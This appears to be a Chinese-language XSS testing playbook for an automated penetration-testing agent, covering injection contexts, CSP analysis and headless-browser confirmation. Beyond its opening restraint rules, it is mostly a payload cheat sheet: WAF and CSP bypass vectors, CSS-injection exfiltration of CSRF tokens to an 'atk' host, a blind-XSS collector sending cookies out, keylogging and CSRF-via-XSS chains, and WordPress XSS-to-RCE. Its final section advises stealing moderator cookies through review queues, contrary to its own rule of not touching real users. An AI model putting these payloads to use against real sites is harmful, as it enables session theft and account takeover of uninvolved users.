---
id: xss-context
title: XSS 上下文手册（反射/存储/DOM sink/CSP 分析）
tags: xss,dom,csp,上下文,s4
---
# XSS 上下文手册

> 判据=可控输入进入**渲染上下文**且可构造事件执行（弹算术值即可，`alert(7*7)` 类无害标记）；**绝不使用会触发外部告警/影响其他用户的 payload**（存储型 XSS 在多用户系统只对测试账号自身注入）。

## 一、上下文逃逸表（输入落在哪决定怎么判）

| 上下文 | 探针 |
|---|---|
| HTML 正文 | `<svg onload=...>` / `<img onerror=...>`（标签被过滤→看输出净化残留） |
| HTML 属性值 | `" onmouseover=... x="`；属性内实体解码行为确认 |
| JS 字符串 | `'-alert(1)-'` / `</script><svg onload=...>`（script 块内闭合判据） |
| URL / href / src | `javascript:` 协议；`data:text/html`；`url(#)` 滤后变体 |
| CSS / style | `expression()`（老 IE）；`style 属性 url()` |
| DOM sink | 源 location.hash/postMessage/referrer → sink innerHTML/document.write/eval/setTimeout：**DOM Invader 思路手工过一遍**，source-sink 对齐表落 evidence |

## 二、存储型纪律（多用户系统）

- 注入目标仅限**测试账号自己的可见面**（个人资料/备注/草稿），禁止跨用户投递（红线：不波及真实用户）。
- 需要他人触发才构成危害链的，写清利用条件（谁触发、多久）但**不实际投递**，转授权确认。

## 三、CSP 与防线分析（报告章节素材）

- CSP 头逐项解读：default-src/script-src unsafe-inline/'unsafe-eval'/nonce/hash 缺失 → 可利用性判断。
- 过滤函数指纹：单次净化 vs 双重净化（&amp;lt; 输出=双重编码差异）→ 判据变体。
- HttpOnly 不影响 XSS 本身，但影响会话窃取危害定级（结合 auth-bypass）。

## 四、登记

- 确证 → record_finding（cwe-79，注明上下文/触发条件/影响用户范围）；误报排除用「输出位不可达/净化完备」证据。

## CSP 分厂商绕过/渗出/延迟触发

- **CSP 分厂商 payload**：Cloudflare 生僻事件 `onnull/onrandom` + `j&#97;v&#97;scr&#105;pt:`；Akamai `</script><base href="javascript:/a]/-alert(1)//">`、`<dETAILS open oNtoggle>`；Incapsula `$.globalEval("al"+"ert(1)")`；Fortiweb `\u003e\u003cscript\u003e`
- **CSS 注入渗出**（style-src unsafe-inline 场景）：属性选择器逐字符 `input[name="csrf"][value^="a"]{background:url(//atk/a)}`；`@font-face unicode-range` 探测文本节点；`@import` 链多轮提取
- **DOM clobbering 多级**：`<a id=x><a id=x name=y href="javascript:...">`；iframe 三层 `x.y.z.href`；DomPurify `cid:` 协议绕过
- **双层 base64 嵌套**（WAF 绕过）：`<iframe src="data:text/html;base64,PG9iamVjdCBkYXRhPWRhdGE6dGV4dC9odG1sO2Jhc2U2NCxQSE5qY21sd2RENWhiR1Z5ZENnbmVITnpKeWs4TDNOamNtbHdkRDQ9Pjwvb2JqZWN0Pg=="></iframe>`（两层解码）
- **属性名插斜杠**：`action/=`、`src/=` 后接 javascript: 绕属性名黑名单：`<iframe src/="data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4="></iframe>`
- **`</:>` 注释拼接**：过滤器把 `</:>` 当注释闭合时拼 formaction 事件
- **延迟/跨页触发**：个人信息 XSS 本页不弹、其他页加载头像时执行——存储 XSS 不能只看当前页
- **XS-Leaks 计时 oracle**：`performance.now()` + Image onload 计时差判断搜索结果存在性
- **多重反射 payload**（WAF 只盯值不看参数名）：`'onload=alert(1)><svg/1='` 双/三反射
- **WordPress XSS→RCE**：plugin-editor.php 抓 nonce → 写 hello.php → 触发（需 admin 会话）
- **postMessage 前缀匹配绕过**：origin 用 .includes() 时 `facebook.com.ATTACKER.com`

### 上下文逃逸补全与盲打方法论

上下文逃逸表补 5 行：引号属性内 `>` 被剥离→`" autofocus onfocus=alert(1)//`；title/textarea 体→`</title><svg onload=alert(1)>`；JS 串双转义→`\'-alert(1)//`；JS 逻辑块→`'}alert(1);{'`；XML 页→`<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>`。PHP_SELF 路径注入：`/page.php/"><svg onload=alert(1)>?p=v`。上传 XSS 三位：文件名反射 `"><svg onload=alert(1)>.gif`；SVG 本体 `<svg onload=alert(1)/>`；EXIF `exiftool -Artist='"><svg onload=alert(1)>' x.jpeg`。不闭合 script：`<script src=data:,alert(1)>`（页面后方有 </script> 时）。二阶载荷：`&lt;svg/onload&equals;alert(1)&gt;`（取出重渲染时执行），检查位=管理后台用户列表。

CSP 通用绕过八式：allowlist 域 JSONP→`<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1);//">`；angular CDN→`<script src="https://ajax.googleapis.com/...angular.min.js"></script><x ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</x>`；base-uri 未限制→`<base href="https://atk/">`；dangling markup→`<img src='https://atk/log?`；self+文件上传→`<script src="/uploads/evil.js">`；data: scheme→`<script src="data:text/javascript,alert(1)">`；strict-dynamic 无 nonce→`document.createElement('script').src='//atk/x.js'`。

WAF 绕过原语组：编码链 `%253C`/`%26lt;`/`<%00h2`/`%0d%0a`；标签变形 `<ScRipt>`/`</script/x>`/`<script`（不完整吃后续 >）/`<svg/onload=`；碎片化绕 strip-tags `"o<x>nmouseover=alert<x>(1)//`；参数名攻击 `?"></script><base%20c=...>`；无事件向量组 `<form action=javascript:alert(1)>`、`<button formaction=javascript:alert(1)>`、`<object data=javascript:alert(1)>`、`<iframe srcdoc=<svg/o&#x6Eload...>>`、`<math><brute href=javascript:alert(1)>`。

Blind XSS 方法论：必测点位（联系表单/UA/Referer/注册字段/错误日志）；回调 `<script src=//atk/bxss.js></script>`；极简收集器 bxss.js（URL+cookie+DOM 外传）；平台 XSS Hunter。利用链补三条：cookie 窃取 fetch、键盘记录 onkeypress 外传、CSRF-via-XSS 三段 XHR（GET settings→正则提 token→POST 改邮箱）；浏览器远程控制 setInterval 外联 script。测试五步法 ZSEANO：无害标签回显→不完整标签→编码探针→无闭合 script→黑名单全查；核心洞察=**有过滤=开发者打过补丁，同一过滤大概率在其他点缺失，全站追查**。SCENARIOS 补遗：Django debug 页 CVE-2017-12794（重名注册触发 IntegrityError）；UTF-7（无 charset+老 IE）`+/v8 +ADw-script+AD4-alert(1)+ADw-/script+AD4-`；HttpOnly 不防利用本身（代理浏览器代发认证请求/读 DOM token 代发/键盘记录/session riding）；会话固定 via XSS（登录前预置 cookie）；XS-Leaks 放大技术+frame counting；polyglot 四条原文（0xsobky/s0md3v/brutelogic/`'">><marquee>...`）；WAF 补遗 Cloudflare `java\nscript:`、Akamai `<animate onbegin=...>`、WordFence `javas&#99;ript:`；多重反射补两条；postMessage 无校验基础 PoC。
## 确证标准：渲染级验证（v3.9.1，反射/DOM 型 XSS 必过）

响应包含 payload ≠ XSS 确证（输出可能落在注释/属性值/转义上下文里不执行）。**反射型与 DOM 型 XSS 的确证 = 真实浏览器渲染后执行确认**；存储型至少确认取出重渲染位含未转义输出。

1. **无头浏览器执行确认**：headless chrome / browser-kit 加载带载荷 URL，hook `alert`/`console` 判执行（`alert(7*7)` 算术值防误报）：
   ```bash
   # 判据：页面上下文真实弹值；超时 10s 无执行 = 未执行（如实记 no_issue_found 并附渲染证据）
   chromium --headless=new --disable-gpu --virtual-time-budget=8000 \
     --run-all-compositor-stages-before-draw \
     --dump-dom "http://<目标>/page?x=<payload>" 2>&1 | grep -i "7x7 标记"
   # DOM 型（#/hash 承载）同样加载；带 JS hook 时用 --enable-logging 捕获 console
   ```
   或 browser-kit 脚本：page.goto → page.on('dialog') 捕获 → 截图留证（evidence/）。
2. **上下文定位先行**：先看输出落在哪个上下文（标签外/属性内单双引号/JS 串/JS 逻辑块），按第一节逃逸表选 payload 再渲染验证——盲发 payload 列表轮番试浪费轮次。
3. **DOM sink 动态确认**：`location.hash/name` 承载的输入浏览器加载后才进 sink，curl 永远测不出——必须渲染验证；`--virtual-time-budget` 给足 JS 执行时间。
4. **留证**：渲染确认截图/console 捕获存 evidence/ 并在 record_finding 引用；无头不可用（环境限制）时降级=人工核对输出 HTML 上下文转义状态（view-source 逐字符核对引号/标签边界），notes 注明「渲染验证不可用，静态上下文核对」。

### 实战补遗（v4.4 一线 SRC 实战实证，已去标识）

- **不常规触发位（二阶跨页）**：个人信息处插入 XSS 当页不弹 ≠ 无洞——其他页面加载该数据时触发（如头像加载路径）；**每个存储点必须做二阶回访**（输入落库→遍历引用该数据的页面/资源加载位）。
- **action 属性斜杠绕过**：`action/=javascript:` ——属性名后插 `/` 绕过 `action=` 关键字黑名单（HTML 解析器容忍属性名与 `=` 间的 `/`）；同族变体 `src/=`、`href/=`。
- **iframe data: 组合**：`<iframe src/="data:text/html;base64,<base64 的 <script>alert(1)</script>>"></iframe>` ——data: URL 内联脚本绕过外链过滤；base64 形态避开明文 script 关键字。
- **审核链打点**：可提交审核的功能（角色/剧本/商家资料类）——payload 存入后由**审核账号**打开触发 → 打审核人 cookie（存储型 XSS 的"第三方触发"证据按 evidence-standard XSS 类要求浏览器执行证据）。
